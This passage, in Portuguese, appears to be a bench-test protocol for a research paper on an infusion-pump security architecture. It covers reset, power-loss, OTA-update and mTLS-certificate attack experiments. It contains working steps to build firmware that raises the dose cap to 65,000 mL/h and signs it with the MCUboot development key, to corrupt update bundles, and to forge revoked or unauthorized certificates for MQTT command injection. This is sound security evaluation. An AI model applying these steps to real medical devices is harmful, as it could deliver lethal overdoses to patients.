| D5 | 20 pulsos de reset |
| D0 | **o STEP volta depois do primeiro reset?** |
| console | 20 × `--- ARGUS MPCS BOOT`; existe algum `Motor ON` depois do primeiro? |

**A métrica que importa não é a da ferramenta.** O E14 mede quanto tempo o MCU
leva para voltar a *responder*. Clinicamente, a pergunta é se a *terapia*
volta. Se D0 ficar mudo depois do primeiro pulso, o registro correto é
"interrupção até novo comando", não "N ms de indisponibilidade".

```sh
reg T9 E14 20 ciclos 20
reg T9 E14 20 indisponibilidade_media_ms <do csv>
reg T9 E14 20 terapia_retomou_apos_reset <0|1>
```

### T5c — Perda de energia do gateway, **com** fio de reset

Mesmo procedimento do T5b, agora com o fio ligado.

```bash
pi 'infundir 600'
cap T5c 200k 24M &
sleep 20;  echo ">>> DESLIGUE A FONTE DA RPi AGORA";  wait
```

**Hipótese.** Com a RPi sem alimentação, o diodo de proteção do GPIO 4 puxa o
NRST para perto de 0 V através do resistor: **o MCU fica preso em reset
enquanto o gateway estiver desligado.** Se confirmar, a falha de energia do
domínio de conectividade derruba o domínio crítico — um modo comum de falha
que contradiz o isolamento, criado por um fio de bancada.

**Observáveis.** D5 (NRST) vai a nível baixo e fica? D0 para? Ao religar a
RPi, o MCU volta, e em que estado?

```sh
reg T5c perda_energia_com_nrst 1 nrst_preso_baixo <1|0>
reg T5c perda_energia_com_nrst 1 step_continuo <1|0>
```

**Desligue o fio de reset ao final deste bloco.**

> Se T5c confirmar, a recomendação de projeto é simples e vai para o artigo
> como mitigação: o reset do domínio crítico pelo gateway, se existir, precisa
> de isolamento (optoacoplador ou supervisor com janela) — ou não existir.

### T6 — Referência: exaustão de recursos do gateway

Não é ataque novo. Serve para provar que **esta montagem reproduz a campanha
publicada** — sem isso, nenhum número novo deste roteiro é comparável aos do
artigo.

No host, deixe um servidor `iperf3` no ar:

```bash
iperf3 -s
```

Na RPi:

```sh
. /data/ameaca_lib.sh
RUN_ATTACKS=0 IPERF_SERVER=<ip-do-host> OUTDIR=$OUT/T6 \
  run_campaign.sh -s baseline,combined -r 3 -n 2000
```

**Critério.** Medianas de `latency_us` dentro de ±1 % das publicadas
(baseline 2.837 µs, combined 2.836 µs). Fora disso, **anote antes de seguir**:
a montagem mudou, e os números novos deste roteiro devem ser lidos contra este
T6, não contra o artigo.

```sh
reg T6 referencia 3 mediana_baseline_us <calculada>
reg T6 referencia 3 mediana_combined_us <calculada>
```

(Cálculo da mediana: `python3 -I plano_ieee/scripts/percentis.py <dir>`,
o script do plano 02 — ou `analyze_campaign.py`, que já acompanha as
ferramentas.)

---

## 6. Bloco C — atualização (F2'') · ≈ 2 h

### 6.1 Preparar as imagens (no host, pode ser feito antes do dia de bancada)

Todas as imagens de teste têm **versão distinta da legítima** (1.1.23). É a
única forma de saber, pelo banner do console, *qual* imagem deu boot depois de
uma atualização: se o teste usasse a mesma versão, aceitar e rejeitar
produziriam o mesmo banner.

| Imagem | Versão | Chave | Conteúdo | Usada em |
|---|---|---|---|---|
| `teste_v99.signed.bin` | 1.1.99 | chave do projeto (`root-rsa-2048.pem`) | igual à legítima | T7b (corrompida), T7e |
| `estranha_v98.signed.bin` | 1.1.98 | **chave nova**, gerada agora | igual à legítima | T7c |
| `adulterada_v66.signed.bin` | 1.1.66 | chave do projeto (`root-rsa-2048.pem`) | **teto de vazão 65.000 mL/h** | T7d |

Os builds de teste são feitos em **cópias** da árvore, fora do repositório,
para que nenhuma alteração adulterada chegue a um commit.

```bash
IMGTOOL=~/zephyrproject/bootloader/mcuboot/scripts/imgtool.py
CHAVE_PROJETO=~/zephyrproject/bootloader/mcuboot/root-rsa-2048.pem
# Mesma arvore que gerou a imagem legitima do OTA de 21/10 (commit 5dd34d1)
SRC=~/Documents/Argus_Artigo/Argus_MCPS_Blackpill_STM32F411_ZephyrRTOS

copia() {  # copia <nome> <patchlevel>
  rm -rf "$B/arvores/$1"; mkdir -p "$B/arvores"
  cp -r "$SRC" "$B/arvores/$1"
  rm -rf "$B/arvores/$1"/build*
  sed -i "s/^PATCHLEVEL = .*/PATCHLEVEL = $2/" "$B/arvores/$1/VERSION"
}
assinado() { find "$1" -name zephyr.signed.bin -path '*zephyr/zephyr.signed.bin' | grep -v mcuboot | head -1; }
```

**teste_v99** — legítima, só muda a versão:

```bash
copia v99 99
west build -p always -b nucleo_u575zi_q --sysbuild "$B/arvores/v99" -d "$B/arvores/v99/build"
cp "$(assinado $B/arvores/v99/build)" $B/imagens/teste_v99.signed.bin
python3 $IMGTOOL verify -k $CHAVE_PROJETO $B/imagens/teste_v99.signed.bin
```

**estranha_v98** — mesma aplicação, assinada por uma chave que o MCUboot da
placa não conhece:

```bash
python3 $IMGTOOL keygen -k $B/chaves/estranha-rsa-2048.pem -t rsa-2048
copia v98 98
west build -p always -b nucleo_u575zi_q --sysbuild "$B/arvores/v98" -d "$B/arvores/v98/build" \
  -- -DSB_CONFIG_BOOT_SIGNATURE_KEY_FILE=\"$B/chaves/estranha-rsa-2048.pem\"
cp "$(assinado $B/arvores/v98/build)" $B/imagens/estranha_v98.signed.bin
python3 $IMGTOOL verify -k $B/chaves/estranha-rsa-2048.pem $B/imagens/estranha_v98.signed.bin   # deve passar
python3 $IMGTOOL verify -k $CHAVE_PROJETO              $B/imagens/estranha_v98.signed.bin   # deve FALHAR
```

> Este build também gera um MCUboot com a chave estranha embutida. **Não grave
> esse MCUboot.** Só o `.signed.bin` da aplicação vai para a placa, e só pelo
> `stm32-updater` — que escreve no slot 1 e não toca no bootloader.

**adulterada_v66** — o firmware que um gateway comprometido gravaria. A
assinatura usa a mesma chave pública do MCUboot que está no build legítimo:

```bash
copia v66 66
sed -i 's/^#define RATE_MAX_ML_H .*/#define RATE_MAX_ML_H        65000U  \/* ADULTERADO - T7d *\//' \
    "$B/arvores/v66/include/protocol_defs.h"
grep -n RATE_MAX_ML_H "$B/arvores/v66/include/protocol_defs.h"     # conferir
west build -p always -b nucleo_u575zi_q --sysbuild "$B/arvores/v66" -d "$B/arvores/v66/build"
cp "$(assinado $B/arvores/v66/build)" $B/imagens/adulterada_v66.signed.bin
python3 $IMGTOOL verify -k $CHAVE_PROJETO $B/imagens/adulterada_v66.signed.bin   # PASSA: e esse o ponto
```

**corrompida** — a v99 com um byte invertido no meio do corpo:

```bash
cp $B/imagens/teste_v99.signed.bin $B/imagens/corrompida_v99.signed.bin
TAM=$(stat -c %s $B/imagens/corrompida_v99.signed.bin)
printf '\xff' | dd of=$B/imagens/corrompida_v99.signed.bin bs=1 seek=$((TAM/2)) conv=notrunc 2>/dev/null
python3 $IMGTOOL verify -k $CHAVE_PROJETO $B/imagens/corrompida_v99.signed.bin   # deve FALHAR
cmp -l $B/imagens/teste_v99.signed.bin $B/imagens/corrompida_v99.signed.bin | wc -l  # 1 (ou 0, se o byte ja era 0xff: troque o offset)
```

Envie todas para a RPi:

```bash
scp $B/imagens/*.signed.bin $PI:/data/ota/
```

### 6.2 Protocolo comum de T7b–T7e

Para cada imagem: bomba **parada** (exceto T7e), captura longa, envio pelo
`stm32-updater`, leitura do banner no console.

**Primeiro, meça quanto dura uma transferência.** A imagem tem ~82 KB, vai em
blocos de 48 bytes a 100 kHz (`OTA_SPEED_HZ`), com esperas entre blocos — a
duração não é óbvia, e a captura precisa cobrir transferência + reinício. A
imagem corrompida serve para isso, porque será rejeitada de qualquer forma:

```bash
pi 'time stm32-updater /data/ota/corrompida_v99.signed.bin >/dev/null'
```

Com a duração `real` em segundos (`DUR`), dimensione as capturas de OTA a
100 kHz — suficiente para o STEP e para o pulso de reset que o STM32 põe no
NRST mesmo num reinício por software:

```bash
DUR=<segundos medidos>
AMOSTRAS_OTA=$(( (DUR + 40) * 100000 ))
```

Como essa medição já fez um envio da imagem corrompida, confira o banner no
console: ele é o primeiro resultado do T7b. Registre-o e, se quiser a captura,
repita o T7b abaixo.

```bash
cap T7x 100k $AMOSTRAS_OTA &  sleep 1
pi 'stm32-updater /data/ota/<imagem>.signed.bin 2>&1 | tee $OUT/T7x_updater.log'
wait
```

Depois do envio, o MCU reinicia em ~2 s (`ota_handler.c:95`) e o MCUboot
decide. **O juiz é a linha `--- ARGUS MPCS BOOT (nucleo_u575zi_q v1.1.<N>)`** no
console:

- `v1.1.23` → a imagem nova foi **rejeitada** e a antiga continuou;
- `v1.1.<99|98|66>` → a imagem nova foi **aceita**.

Sem console, o mesmo veredicto sai do barramento, ~10 s depois do envio:

```bash
pi 'sleep 10; argus-versao'          # versao=1.1.<N> estado=<n> (<nome>)
```

As versões distintas das imagens de teste são o que torna isso possível.

### T7b — Imagem corrompida

```bash
cap T7b 100k $AMOSTRAS_OTA &  sleep 1
pi 'stm32-updater /data/ota/corrompida_v99.signed.bin 2>&1 | tee $OUT/T7b_updater.log';  wait
```

**Esperado:** banner `v1.1.23`. O MCUboot verifica o hash da imagem antes do
swap.

```sh
reg T7b ota_corrompida 1 versao_apos_boot <1.1.23|1.1.99>
```

### T7c — Assinatura com chave estranha

```bash
cap T7c 100k $AMOSTRAS_OTA &  sleep 1
pi 'stm32-updater /data/ota/estranha_v98.signed.bin 2>&1 | tee $OUT/T7c_updater.log';  wait
```

**Esperado:** banner `v1.1.23`.

```sh
reg T7c ota_chave_estranha 1 versao_apos_boot <1.1.23|1.1.98>
```

### T7d — Firmware adulterado assinado com a chave pública do MCUboot · testa H1

**É o experimento mais importante do roteiro.**

```bash
cap T7d_ota 100k $AMOSTRAS_OTA &  sleep 1
pi 'stm32-updater /data/ota/adulterada_v66.signed.bin 2>&1 | tee $OUT/T7d_updater.log';  wait
```

Se o banner mostrar `v1.1.66`, prove a consequência física **com a mesma
ferramenta e a mesma sequência do T1**:

```bash
pi 'infundir 600'
cap T7d_dose 4m 60M &  sleep 1;  pi 'argus-attack --only E13 -o $OUT/T7d_E13.csv';  wait
pi 'pausar'
```

**Esperado sob H1:** `pedido_5000_efetivo = 5000`, `pedido_65000_efetivo = 65000`,
e em D0 o STEP em **≈ 7 kHz** e depois **≈ 92 kHz** — cerca de 4× e 54× a
frequência do teto. A comparação lado a lado com `T1a_rep01.sr` é a figura que resume o
achado.

```sh
reg T7d ota_chave_publica 1 versao_apos_boot <1.1.23|1.1.66>
reg T7d ota_chave_publica 1 step_max_hz <medido>
```

**Leitura.** Se H1 confirmar, as afirmações *"compromise of the connectivity
domain does not confer authority over the delivered dose"* e *"F3 holds
independently of F1 and F2"* **deixam de valer** enquanto a chave de
assinatura for a de desenvolvimento do MCUboot. O resultado não invalida a
arquitetura — invalida a **implantação** dela. O texto do artigo precisa dizer
exatamente isso, e a mitigação — chave de assinatura própria e privada,
guardada fora do gateway e fora do repositório, de modo que o gateway
*transporte* imagens mas não consiga *produzi-las* — vai para o modelo de
ameaça e para os riscos residuais.

Se o banner continuar em `v1.1.23`, H1 está refutada: confira com
`imgtool verify` qual chave a placa de fato aceita antes de concluir.

### T7e — Atualização legítima durante a infusão · testa H2

Antes, volte à imagem legítima (o T7d deixou a v66 rodando):

```bash
cd ~/Documents/Argus_Artigo/argus-amp-infusion-pump/control-domain
west flash -d build-legitimo          # banner deve voltar a v1.1.23
```

Agora com a bomba **infundindo**:

```bash
pi 'infundir 600'
cap T7e 100k $AMOSTRAS_OTA &  sleep 1
pi 'stm32-updater /data/ota/teste_v99.signed.bin 2>&1 | tee $OUT/T7e_updater.log';  wait
```

**Hipótese H2.** O MCU aceita a atualização sem consultar o estado da terapia,
reinicia ~2 s depois do `OTA_END` e volta em `IDLE`: D0 para e **não volta**.

**Observáveis.** Em D0: duração da infusão durante a transferência (ela
continua enquanto os blocos chegam?) e instante da parada. No console: banner
`v1.1.99` e ausência de `Motor ON` depois dele.

```sh
reg T7e ota_durante_infusao 1 aceita_durante_running <1|0>
reg T7e ota_durante_infusao 1 terapia_retomou <1|0>
reg T7e ota_durante_infusao 1 tempo_ate_parada_s <do fim da transferencia ao ultimo pulso>
```

### T7a — Bundle RAUC adulterado (gateway)

A metade do canal de atualização que fica no gateway. Use o bundle da própria
imagem da RPi 3:

```bash
BUNDLE=~/Documents/Argus_Artigo/Argus_MCPS_RPi-Zero2W_YoctoProject/build/tmp/deploy/images/raspberrypi3/infusion-bundle-raspberrypi3.raucb
cp $BUNDLE $B/imagens/bundle_legitimo.raucb
cp $BUNDLE $B/imagens/bundle_adulterado.raucb
TAM=$(stat -c %s $B/imagens/bundle_adulterado.raucb)
printf '\xff' | dd of=$B/imagens/bundle_adulterado.raucb bs=1 seek=$((TAM/3)) conv=notrunc 2>/dev/null
scp $B/imagens/bundle_*.raucb $PI:/data/ota/
```

Na RPi:

```sh
. /data/ameaca_lib.sh
rauc info /data/ota/bundle_legitimo.raucb   2>&1 | tee $OUT/T7a_info_legitimo.log    # deve verificar
rauc info /data/ota/bundle_adulterado.raucb 2>&1 | tee $OUT/T7a_info_adulterado.log  # deve FALHAR
rauc install /data/ota/bundle_adulterado.raucb 2>&1 | tee $OUT/T7a_install.log       # deve FALHAR
rauc status 2>&1 | tee $OUT/T7a_status_depois.log
```

> **Não rode `rauc install` no bundle legítimo** — ele instalaria de verdade e
> trocaria o slot no próximo boot. Se, contra o esperado, o adulterado for
> instalado, **não reinicie** e desfaça com
> `rauc status mark-active booted`, depois anote: é achado, não acidente.

```sh
reg T7a rauc_adulterado 1 rejeitado <1|0>
reg T7a rauc_adulterado 1 mensagem "<primeira linha de erro, sem virgulas>"
```

---

## 7. Bloco D — certificados (F1) · ≈ 1,5 h

Adversário A1, no **host**, pela rede. A RPi fica com o `infusion-pump`
**parado** (nada consome `bomba/comando`, então nenhuma mensagem que passe
vira atuação) e o `mosquitto` no ar.

### 7.1 Qual CA — conferido no projeto

Há duas CAs diferentes no projeto. Só uma é a da imagem da RPi 3:

| Arquivo | Corresponde à CA da imagem? |
|---|---|
| `Argus_MCPS_RPi-Zero2W_YoctoProject/meta-infusion-pump/recipes-connectivity/mosquitto/files/certs/ca.crt` | **é** a CA da camada que gerou a imagem |
| `Argus_MCPS_RPi-Zero2W_YoctoProject/backend_certs/ca.key` | **sim** — mesma chave pública |
| `Argus_MCPS_RPi-Zero2W_YoctoProject/backend_certs/backend.crt` | **sim** — verifica contra a CA da imagem |
| `backend/certs/ca.crt` e `backend/certs/backend.crt` | **não** — outra CA |

O último item é um achado lateral: o backend em `backend/` usa outra CA e,
como está, não conectaria no broker desta imagem.

```bash
Y=~/Documents/Argus_Artigo/Argus_MCPS_RPi-Zero2W_YoctoProject
CA_CRT=$Y/meta-infusion-pump/recipes-connectivity/mosquitto/files/certs/ca.crt
CA_KEY=$Y/backend_certs/ca.key          # usada so para EMITIR certificados de teste
BK_CRT=$Y/backend_certs/backend.crt
BK_KEY=$Y/backend_certs/backend.key
cd $B/t8
```

O certificado do servidor tem `CN=argus-pump.local`. Para que a verificação de
nome valha (e não seja desligada com `--insecure`), aponte o nome para a RPi:

```bash
echo "<ip-da-pi> argus-pump.local" | sudo tee -a /etc/hosts
```

**Pré-verificação — a CA local é a mesma do broker em execução?**

```bash
openssl s_client -connect argus-pump.local:8883 -CAfile $CA_CRT \
  -cert $BK_CRT -key $BK_KEY </dev/null 2>/dev/null | grep "Verify return code"
```

Tem que dar `Verify return code: 0 (ok)`. Se não der, a imagem foi gerada com
outra CA e **o T8 não tem leitura** com estes arquivos — pare e localize a CA
certa antes de seguir.

### 7.2 Gerar os certificados de teste

Uma mini-CA do `openssl ca` reaproveitando a chave real (precisa dela para
emitir o expirado, o de CN não autorizado e o revogado). Tudo dentro de
`$B/t8`, fora do repositório:

```bash
mkdir -p novos && : > index.txt && echo 1000 > serial && echo 1000 > crlnumber
cat > mini.cnf <<'CNF'
[ ca ]
default_ca = mini
[ mini ]
dir              = .
database         = $dir/index.txt
new_certs_dir    = $dir/novos
serial           = $dir/serial
crlnumber        = $dir/crlnumber
default_md       = sha256
default_days     = 30
default_crl_days = 30
policy           = pol
unique_subject   = no
copy_extensions  = none
[ pol ]
commonName = supplied
CNF

emite() {  # emite <nome> <CN> [opcoes extras do openssl ca]
  local n=$1 cn=$2; shift 2
  openssl genrsa -out $n.key 2048 2>/dev/null
  openssl req -new -key $n.key -subj "/CN=$cn" -out $n.csr
  openssl ca -batch -config mini.cnf -cert $CA_CRT -keyfile $CA_KEY \
             -in $n.csr -out $n.crt "$@" 2>/dev/null
}

# C2: CA estranha, CN valido
openssl req -new -x509 -days 30 -nodes -subj "/CN=CA-Estranha" \
        -keyout estranha_ca.key -out estranha_ca.crt 2>/dev/null
openssl genrsa -out c2.key 2048 2>/dev/null
openssl req -new -key c2.key -subj "/CN=backend-service" -out c2.csr
openssl x509 -req -in c2.csr -CA estranha_ca.crt -CAkey estranha_ca.key \
        -CAcreateserial -days 30 -out c2.crt 2>/dev/null

# C3: CA real, CN valido, EXPIRADO
emite c3 backend-service -startdate 20250101000000Z -enddate 20250102000000Z

# C4: CA real, valido, CN SEM permissao na ACL
emite c4 intruso

# C5: CA real, CN valido, REVOGADO
emite c5 backend-service
openssl ca -config mini.cnf -cert $CA_CRT -keyfile $CA_KEY -revoke c5.crt 2>/dev/null
openssl ca -config mini.cnf -cert $CA_CRT -keyfile $CA_KEY -gencrl -out crl.pem 2>/dev/null
openssl crl -in crl.pem -noout -text | grep -A1 "Serial Number"   # c5 tem de constar

# Conferencia
for c in c3 c4 c5; do printf "%s: " $c; openssl verify -CAfile $CA_CRT $c.crt 2>&1 | tail -1; done
openssl verify -CAfile $CA_CRT -crl_check -CRLfile crl.pem c5.crt 2>&1 | tail -1   # "revoked"
```

Esperado: c3 `certificate has expired`; c4 `OK`; c5 `OK` sem CRL e `certificate
revoked` com CRL. O broker **não** tem `crlfile` em `mosquitto.conf` — por isso
o c5 é o caso interessante.

### 7.3 Os sete casos

Observador, num terceiro terminal do host, assinando os dois tópicos com a
credencial legítima (o backend pode ler `bomba/status`; para ver
`bomba/comando`, use o listener local da RPi):

```bash
pi 'mosquitto_sub -h 127.0.0.1 -t bomba/comando -v' | ts '%H:%M:%.S' > $B/t8/obs_comando.log &
mosquitto_sub -h argus-pump.local -p 8883 --cafile $CA_CRT --cert $BK_CRT --key $BK_KEY \
  -t bomba/status -v | ts '%H:%M:%.S' > $B/t8/obs_status.log &
```

Função de tentativa — publica com MQTT v5 e QoS 1, para que uma negação da ACL
volte como código de motivo em vez de ser descartada em silêncio:

```bash
tenta() {  # tenta <caso> <topico> <reps> [credenciais]
  local caso=$1 top=$2 n=$3; shift 3
  local ok=0 negado=0 falha_tls=0
  for i in $(seq 1 $n); do
    saida=$(mosquitto_pub -h argus-pump.local -p 8883 --cafile $CA_CRT "$@" \
            -V mqttv5 -q 1 -t "$top" -m "T8-$caso-$i" 2>&1); rc=$?
    # A negacao da ACL vem antes: dependendo da versao, o cliente imprime
    # o aviso e ainda assim sai com codigo 0.
    if   echo "$saida" | grep -qi "not authori";  then negado=$((negado+1))
    elif [ $rc -eq 0 ];                           then ok=$((ok+1))
    else                                               falha_tls=$((falha_tls+1)); fi
  done
  echo "$caso,$n,$ok,$negado,$falha_tls" | tee -a $B/t8/resultado.csv
  echo "   ultima saida: $saida"
}
echo "caso,tentativas,aceitas,negadas_acl,falha_conexao" > $B/t8/resultado.csv
```

| Caso | Comando | Esperado |
|---|---|---|
| **C0** controle | `tenta C0 bomba/comando 100 --cert $BK_CRT --key $BK_KEY` | 100 aceitas, 100 no `obs_comando.log` |
| C1 sem certificado | `tenta C1 bomba/comando 100` | 100 falhas de conexão |
| C2 CA estranha | `tenta C2 bomba/comando 100 --cert c2.crt --key c2.key` | 100 falhas de conexão |
| C3 expirado | `tenta C3 bomba/comando 100 --cert c3.crt --key c3.key` | 100 falhas de conexão |
| C4 CN sem permissão | `tenta C4 bomba/comando 100 --cert c4.crt --key c4.key` | conecta; **100 negadas pela ACL**; nada no observador |
| C5 revogado | `tenta C5 bomba/comando 100 --cert c5.crt --key c5.key` | **100 aceitas** (sem `crlfile`) — não contido |
| C6 backend forja status | `tenta C6 bomba/status 100 --cert $BK_CRT --key $BK_KEY` | 100 negadas pela ACL; nada em `obs_status.log` |

**Sem o C0, nenhum dos outros tem leitura**: é ele que prova que a montagem
entrega mensagens quando deve. Rode-o primeiro.

Depois de todos, conte o que chegou de fato aos observadores — o código de
retorno do cliente não basta:

```bash
for c in C0 C1 C2 C3 C4 C5; do printf "%s chegou: " $c; grep -c "T8-$c-" $B/t8/obs_comando.log; done
printf "C6 chegou: "; grep -c "T8-C6-" $B/t8/obs_status.log
```

Na RPi, o log do broker registra o motivo de cada recusa:

```sh
journalctl -u mosquitto --since "-30min" --no-pager > $OUT/T8_mosquitto.log
```

### 7.4 O que interessa ao artigo: recusar não custa determinismo

Rode **duas vezes** a mesma medição de latência na RPi — uma em repouso, outra
enquanto o host martela C1–C4 em laço:

```sh
. /data/ameaca_lib.sh
argus-bench -n 20000 --interval-us 2000 --cmd mix --label T8_ref \
            -o $OUT/T8_latencia_ref.csv
```

```bash
# no host, iniciar ANTES de disparar a segunda medicao:
( while :; do tenta C1 bomba/comando 20 >/dev/null; tenta C2 bomba/comando 20 --cert c2.crt --key c2.key >/dev/null
             tenta C3 bomba/comando 20 --cert c3.crt --key c3.key >/dev/null; tenta C4 bomba/comando 20 --cert c4.crt --key c4.key >/dev/null
  done ) &  MARTELO=$!
```

```sh
argus-bench -n 20000 --interval-us 2000 --cmd mix --label T8_sob_ataque \
            -o $OUT/T8_latencia_ataque.csv
```

```bash
kill $MARTELO
```

(O martelo grava linhas extras em `resultado.csv`; filtre pelos 100 de cada
caso da tabela 7.3 na hora de consolidar.)

**Critério.** Mediana e p99 de `latency_us` sob ataque dentro da dispersão de
`T6` para o baseline. É essa frase, e não "o mTLS recusa", que entra no artigo.

```sh
reg T8 C0 100 aceitas <n>
reg T8 C1 100 recusadas <n>
reg T8 C2 100 recusadas <n>
reg T8 C3 100 recusadas <n>
reg T8 C4 100 negadas_acl <n>
reg T8 C5 100 aceitas_revogado <n>
reg T8 C6 100 negadas_acl <n>
reg T8 latencia 1 mediana_ref_us <calculada>
reg T8 latencia 1 mediana_ataque_us <calculada>
reg T8 latencia 1 p99_ref_us <calculada>
reg T8 latencia 1 p99_ataque_us <calculada>
```

Copie os arquivos do T8 para junto da campanha:

```bash
kill %1 %2 2>/dev/null                     # encerra os dois observadores
DEST=$(pi 'echo $OUT')
scp $B/t8/resultado.csv $B/t8/obs_*.log "$PI:$DEST/"   # sem as chaves
```

---

## 8. Restauração · ≈ 15 min

Ao final de cada dia de bancada, e obrigatoriamente depois do Bloco C:

```bash
# Firmware legitimo, pelo ST-Link (nao depende do OTA)
cd ~/Documents/Argus_Artigo/argus-amp-infusion-pump/control-domain
west flash -d build-legitimo
```

Sem ST-Link no host, por OTA — funciona inclusive a partir da v66
adulterada, que mantém o mesmo tratamento de OTA no `hub.c`:

```sh
systemctl stop infusion-pump
stm32-updater /data/ota/legitimo_v1.1.23_5dd34d1.signed.bin
sleep 10; argus-versao               # tem de voltar a versao=1.1.23
```

Confira no console: `--- ARGUS MPCS BOOT (nucleo_u575zi_q v1.1.23)`.

```sh
# Na RPi
rauc status                        # slot em uso marcado como good
# a imagem legitima fica: e ela que restaura por OTA
(cd /data/ota && rm -f teste_v99.signed.bin corrompida_v99.signed.bin estranha_v98.signed.bin \
                     adulterada_v66.signed.bin bundle_adulterado.raucb)   # ash nao tem chaves {a,b}
systemctl start infusion-pump
```

```bash
# No host
sudo sed -i '/argus-pump.local/d' /etc/hosts      # se nao for usar de novo
```

- [ ] Fio de reset desligado
- [ ] Banner `v1.1.23`
- [ ] `infusion-pump` ativo
- [ ] `$B/arvores/v66` **apagada** — é o firmware adulterado:
      `rm -rf ~/argus-bancada-ameaca/arvores/v66`
- [ ] Nada de `~/argus-bancada-ameaca/` dentro de qualquer repositório

---

## 9. Consolidação · ≈ 30 min

### 9.1 Trazer a campanha para o projeto

```bash
DEST=$(pi 'echo $OUT')
mkdir -p ~/Documents/Argus_Artigo/resultados
scp -r "$PI:$DEST" ~/Documents/Argus_Artigo/resultados/
cp -r $B/la ~/Documents/Argus_Artigo/resultados/$(basename $DEST)/capturas
cp $B/vcp/console.log ~/Documents/Argus_Artigo/resultados/$(basename $DEST)/
```

Conferência de que nenhuma chave veio junto:

```bash
find ~/Documents/Argus_Artigo/resultados/$(basename $DEST) \( -name '*.key' -o -name '*.pem' \) -print
```

Tem que sair vazio.

### 9.2 A tabela de rastreamento

É o produto da bancada e o que vai para a `tab:threats` do artigo (plano 01).
Preencha a partir de `ameacas.csv`, das capturas e do console:

| ID | Ameaça | Adv. | Fronteira | Experimento | n | Resultado medido | Veredicto | Arquivos |
|---|---|---|---|---|---|---|---|---|
| T1 | Dose excessiva | A2 | F3 | E13 | 100 pedidos | STEP máx. ___ Hz; semântica ___ | | `T1*_E13_*.csv`, `la/T1a_rep01.sr` |
| T2 | Replay | A2 | F2 | E7 | 200 | ___/200 aceitos; STEP 848 → ___ Hz | | `T2_*` |
| T3 | Forja (aborto) | A2 | F2 | E8 | 30 | ___/30 aceitos; parada em ___ µs | | `T3_*` |
| T4a | Truncamento | A2 | F2 | E9 | 200 | ___/200; ___ ms | | `T4a_*` |
| T4b | Rajada malformada | A2 | F2 | `--fault-every 1` | 6 rajadas | reinício: ___ | | `T4b_*` |
| T4c | Erros de driver pelo relógio | A2 | F2 | `--spi-hz 2 MHz` | 1 | reinício: ___; terapia retomou: ___ | | `T4c*` |
| T5a | Morte do processo | falha | — | `kill -9` | 1 | STEP contínuo ___ s | | `la/T5a.sr` |
| T5b | Perda de energia | falha | — | fonte | 1 | STEP contínuo: ___ | | `la/T5b.sr` |
| T5c | Perda de energia + NRST | falha | F2' | fonte | 1 | NRST preso: ___ | | `la/T5c.sr` |
| T6 | Exaustão de recursos | A2 | — | `run_campaign` | 3+3 | ___ / ___ µs | | `T6/` |
| T7a | Bundle adulterado | A2 | F2''(gw) | `rauc` | 1 | rejeitado: ___ | | `T7a_*` |
| T7b | Imagem corrompida | A2 | F2'' | OTA | 1 | boot em v___ | | `T7b_*` |
| T7c | Chave estranha | A2 | F2'' | OTA | 1 | boot em v___ | | `T7c_*` |
| T7d | Chave pública MCUboot | A2 | F2'' | OTA + E13 | 1 | boot em v___; STEP ___ Hz | | `T7d_*`, `la/T7d_dose.sr` |
| T7e | OTA durante infusão | A2 | F2'' | OTA | 1 | terapia retomou: ___ | | `T7e_*` |
| T8 | Certificado (C0–C6) | A1 | F1 | `mosquitto_pub` | 700 | ver 7.3; latência ___ vs ___ µs | | `T8_*`, `resultado.csv` |
| T9 | Reset em laço | A2 | F2' | E14 | 20 | terapia retomou: ___ | | `T9_*`, `la/T9.sr` |

Veredictos possíveis, sempre um destes três:

- **contido** — a fronteira declarada segurou;
- **não contido; exposição limitada por ___** — a fronteira cedeu, outra limitou o dano (ex.: T2, limitado por F3);
- **não contido** — nenhuma fronteira limitou.

### 9.3 Como cada resultado volta para o artigo

| Se... | Então no artigo |
|---|---|
| T1b mostrar rejeição com retenção | corrigir `tab:attacks` e o parágrafo de contenção: "rejected; the previously configured rate was retained" |
| **H1 confirmar (T7d)** | F2'' entra no modelo de ameaça; o texto passa a dizer que F3 é independente de F1 e F2 **desde que** a chave de assinatura do domínio crítico não esteja ao alcance do gateway; chave de desenvolvimento vira risco residual com mitigação nomeada |
| H2 confirmar (T7e) | risco residual: atualização interrompe a terapia; mitigação: recusar `OTA_START` fora de `IDLE`/`PAUSED` |
| T4c com reinício | risco residual: negação de terapia pelo barramento; mitigação: o reinício por erros de barramento não pode descartar o estado da terapia |
| H4 confirmar (T9) | F2' entra no modelo de ameaça; E14 entra na `tab:attacks` com a métrica clínica (terapia não retomada) |
| T5c com NRST preso | modo comum de falha introduzido pela linha de reset; mitigação: isolamento ou remoção |
| T8 C5 aceito | risco residual R10 (revogação não verificada) com número medido |
| T6 fora de ±1 % | a montagem mudou; declarar a procedência desta campanha separadamente da publicada |

Os achados negativos **não enfraquecem** o artigo: transformam "a arquitetura
é segura" em "estas fronteiras seguram, estas cedem, e é por isto". É o que o
revisor do IEEE pediu com *formal threat model linked to each experiment* e
*report residual risks*.

---

## 10. Ordem de execução sugerida

| Bloco | Conteúdo | Tempo | Pode ser outro dia? |
|---|---|---|---|
| Preparação | 3.1–3.5, imagens de 6.1 e certificados de 7.2 | 1 h 30 | imagens e certificados podem ser feitos **antes** |
| A | T1, T2, T3, T4a, T4b, T4c | 2 h | sim |
| B | T5a, T5b, T9, T5c, T6 | 1 h 30 | sim — exige o fio de reset no meio |
| C | T7b, T7c, T7d, T7e, T7a | 1 h 30 | sim — **sempre** terminar com a restauração (8) |
| D | T8 (7.1–7.4) | 1 h 30 | sim |
| Fecho | 8, 9 | 45 min | — |

**Se só houver tempo para um bloco, faça o C.** O T7d é o único experimento
deste roteiro cujo resultado pode mudar uma afirmação central do artigo.

---

## Apêndice A — patch do E13 para ordem livre de pedidos (T1b)

O E13 tem a sequência fixa `{600, 1200, 5000, 65000}`. Para T1b é preciso
escolher a ordem. Patch mínimo em
`connectivity-domain/meta-infusion-pump/recipes-apps/infusion-control/files/src/tools/argus_attack.cpp`:

```diff
@@ (perto de g_out)
 static FILE* g_out = nullptr;
+
+// Sequencia de pedidos do E13. Padrao = a da campanha publicada.
+static std::vector<uint32_t> g_rates = {600, 1200, 5000, 65000};

@@ static void exp_limite_terapeutico(Stm32Bridge& bridge)
-    const uint32_t pedidos[] = {600, 1200, 5000, 65000};
-    int rejeitados = 0;
-    const int N = (int) (sizeof(pedidos) / sizeof(pedidos[0]));
+    const std::vector<uint32_t>& pedidos = g_rates;
+    int rejeitados = 0;
+    const int N = (int) pedidos.size();

@@ main(), na cadeia de argumentos
         else if(a == "--reset-cycles") reset_ciclos = atoi(next());
+        else if(a == "--rates")
+        {
+            const std::string s = next();
